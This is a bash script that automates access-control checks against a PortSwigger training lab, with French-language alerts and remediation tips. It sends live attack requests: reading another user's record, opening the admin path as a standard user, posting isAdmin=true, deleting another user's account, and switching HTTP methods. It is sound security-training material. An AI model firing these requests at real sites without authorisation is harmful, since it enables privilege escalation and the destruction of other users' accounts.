#!/bin/bash

# PortSwigger Access Control Challenges - Automated Bash Script with Functions and Suggestions
# Requires: curl, jq (optional for JSON parsing)
# Usage: Edit the variables below with your session cookies and target URLs.

# --------- Configuration (edit these values) ---------
BASE_URL="https://<your-lab>.web-security-academy.net"
COOKIE_USER1="session=<session_cookie_user1>"
COOKIE_USER2="session=<session_cookie_user2>"
TARGET_USER_ID="124"   # Example target user ID for IDOR/horizontal tests
ADMIN_PATH="/admin"
UPDATE_PROFILE_PATH="/api/update-profile"
DELETE_USER_PATH="/api/user/"
# -----------------------------------------------------

# Helper function to print a separator
print_sep() {
    echo "------------------------------------------------------"
}

# Function for horizontal access control (IDOR)
test_idor() {
    print_sep
    echo "[1] Contrôle d'accès horizontal (IDOR)"
    resp1=$(curl -s -b "$COOKIE_USER1" "$BASE_URL/api/user/$TARGET_USER_ID")
    resp2=$(curl -s -b "$COOKIE_USER2" "$BASE_URL/api/user/$TARGET_USER_ID")
    echo "Réponse avec USER1 : $resp1"
    echo "Réponse avec USER2 : $resp2"
    if [[ "$resp1" == "$resp2" && "$resp1" != "" ]]; then
        echo ">> [ALERTE] Possible IDOR : même réponse pour deux utilisateurs différents !"
        echo ">> PROPOSITION : Implémenter une vérification côté serveur de l'appartenance de la ressource à l'utilisateur authentifié."
    else
        echo ">> [OK] Pas d'IDOR détecté selon ce test."
    fi
}

# Function for vertical privilege escalation
test_vertical() {
    print_sep
    echo "[2] Contrôle d'accès vertical (élévation de privilèges)"
    resp1=$(curl -s -b "$COOKIE_USER1" "$BASE_URL$ADMIN_PATH")
    if [[ "$resp1" != *"Unauthorized"* && "$resp1" != *"Forbidden"* && "$resp1" != "" ]]; then
        echo "Réponse utilisateur standard : $resp1"
        echo ">> [ALERTE] Accès admin possible avec un compte non privilégié !"
        echo ">> PROPOSITION : Restreindre l'accès à ce chemin aux seuls comptes administrateurs (vérification stricte du rôle)."
    else
        echo ">> [OK] Pas d'accès admin détecté pour un compte standard."
    fi
}

# Function for parameter manipulation (isAdmin, role)
test_param_manipulation() {
    print_sep
    echo "[3] Contrôle d'accès par manipulation de paramètres cachés"
    resp=$(curl -s -b "$COOKIE_USER1" -d "username=wiener&isAdmin=true" "$BASE_URL$UPDATE_PROFILE_PATH")
    echo "Réponse à la tentative d'élévation : $resp"
    if [[ "$resp" == *"isAdmin"* && "$resp" == *"true"* ]]; then
        echo ">> [ALERTE] L'utilisateur peut s'auto-attribuer des droits admin !"
        echo ">> PROPOSITION : Filtrer et ignorer côté serveur toute tentative de modification de rôle par l'utilisateur."
    else
        echo ">> [OK] Pas d'élévation de privilège via paramètre détectée."
    fi
}

# Function for sensitive actions (delete other user)
test_sensitive_action() {
    print_sep
    echo "[4] Contrôle d'accès sur actions sensibles (suppression d'utilisateur)"
    resp=$(curl -s -b "$COOKIE_USER1" -X DELETE "$BASE_URL$DELETE_USER_PATH$TARGET_USER_ID")
    echo "Réponse à la suppression : $resp"
    if [[ "$resp" == *"success"* || "$resp" == *"deleted"* ]]; then
        echo ">> [ALERTE] Un utilisateur peut supprimer le compte d'un autre !"
        echo ">> PROPOSITION : Vérifier côté serveur que l'utilisateur ne peut agir que sur ses propres ressources."
    else
        echo ">> [OK] Pas de suppression d'autres comptes possible selon ce test."
    fi
}

# Function for method-based access control
test_method_based() {
    print_sep
    echo "[5] Contrôle d'accès basé sur la méthode HTTP"
    resp_post=$(curl -s -b "$COOKIE_USER1" -X POST "$BASE_URL/api/user/$TARGET_USER_ID")
    resp_get=$(curl -s -b "$COOKIE_USER1" -X GET "$BASE_URL/api/user/$TARGET_USER_ID")
    echo "Réponse POST : $resp_post"
    echo "Réponse GET  : $resp_get"
    if [[ "$resp_post" != "$resp_get" && "$resp_post" != "" ]]; then
        echo ">> [ALERTE] Endpoint accessible via une méthode inattendue !"
        echo ">> PROPOSITION : Restreindre strictement les méthodes HTTP autorisées sur chaque endpoint."
    else
        echo ">> [OK] Pas de contournement par méthode HTTP détecté."
    fi
}

# Main script execution
echo "=== PortSwigger Access Control Automated Checks ==="
test_idor
test_vertical
test_param_manipulation
test_sensitive_action
test_method_based

echo
print_sep
echo "[SYNTHÈSE]"
echo "Comparez les réponses ci-dessus pour identifier d'éventuelles failles."
echo "Pour chaque alerte, appliquez les propositions correctives recommandées."
echo "Documentation PortSwigger : https://portswigger.net/web-security/access-control/"
print_sep

# End of script
